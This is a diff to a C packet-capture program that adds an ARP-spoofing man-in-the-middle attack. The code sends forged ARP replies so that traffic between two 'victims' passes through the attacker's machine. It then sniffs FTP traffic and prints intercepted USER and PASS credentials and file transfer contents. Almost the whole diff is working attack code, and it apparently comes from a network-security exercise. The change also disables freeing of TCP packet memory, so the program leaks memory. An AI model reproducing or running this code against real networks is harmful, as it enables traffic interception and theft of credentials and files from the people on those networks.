@@ -14,41 +14,89 @@
 
 #include "packetManage.h"
 #include "utils.h"
-
+#include "targets.h"
 
 
 void my_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
+
 
 	//ARP packet creation and allocation
 	ARP_packet *arp=malloc(sizeof(ARP_packet));
 	
 	//Trying to convert packet into ARP
 	if(ARP_packet_construct(arp,header,packet)!=-1){
-		printf("ARP packet detected\n");
 		//do thing with arp object
+
+		//process packets that came from victims
+		if(maccmp(&arp->source,mac_victim1)==0&&(maccmp(&arp->target,mac_victim2)==0||maccmp(&arp->target,mac_attacker)==0||maccmp(&arp->target,mac_bcast)==0)){
+			if(verbose==1)
+                printf("     ☠️  ☠️  ☠️   packet intercepted from victim 1  ☠️  ☠️  ☠️   \n");
+			replyARP(mac_victim1,ip_victim1,ip_victim2,mac_attacker,(libnet_t*)args);
+		}
+		if(maccmp(&arp->source,mac_victim2)==0&&(maccmp(&arp->target,mac_victim1)==0||maccmp(&arp->target,mac_attacker)==0||maccmp(&arp->target,mac_bcast)==0)){
+            if(verbose==1)
+                printf("     ☠️  ☠️  ☠️   packet intercepted from victim 2  ☠️  ☠️  ☠️   \n");
+			replyARP(mac_victim2,ip_victim2,ip_victim1,mac_attacker,(libnet_t*)args);
+		}
+
 		ARP_free(arp);
+
 		return;
 	}else
 		ARP_free(arp);
 
-	return; //TODO: delete 
+
 
 	//TCP packet creation and allocation
 	TCP_packet *tcp=malloc(sizeof(TCP_packet));
 
 	//Trying to convert packet into TCP
 	if(TCP_packet_construct(tcp,header,packet)!=-1){
-		printf("TCP packet detected in port %d\n",ntohs(tcp->tcp_header_t->th_dport));
+
+
+
 		//only processing TCP of port 20 or 21 because are the ports used by FTP
 		if (ntohs(tcp->tcp_header_t->th_dport)==21||ntohs(tcp->tcp_header_t->th_dport)==20){
-			//spoof packet
+
+            //if payload start with USER
+            if(strncmp(tcp->payload,"USER",4)==0){
+                //if verbose is enabled print the payload
+                if(verbose==1) {
+                    printf("User name packet intercepted\n");
+                    printPayload(tcp->payload, tcp->payload_length);
+                }
+            }
+            //if payload start with PASS
+            if(strncmp(tcp->payload,"PASS",4)==0){
+                //if verbose is enabled print the payload
+                if(verbose==1){
+                    printf("Password packet intercepted\n");
+                    printPayload(tcp->payload, tcp->payload_length);
+                }
+            }
+
+            //if packet start with STOR ('store' in server) or RETR ('retreive' from server)
+            if(strncmp(tcp->payload,"STOR",4)==0||strncmp(tcp->payload,"RETR",4)==0){
+                //if verbose is enabled print the payload
+
+                printf("Transmision of packet intercepted\n");
+                printPayload(tcp->payload+4,tcp->payload_length-4);
+                
+            //if packet start with GET (same as RETR, but more common/modern version)
+            } else if(strncmp(tcp->payload,"GET",3)==0) {
+            
+                printf("Transmision of packet intercepted\n");
+                printPayload(tcp->payload+3,tcp->payload_length-3);
+            }
+
+
 		}
 
-		
-		TCP_free(tcp);
+
+		//TCP_free(tcp);
 		return;
-	}else
-		TCP_free(tcp);
+	}//else
+		//TCP_free(tcp);
 	//printf("Error obtaining packet type\n");
 
 }
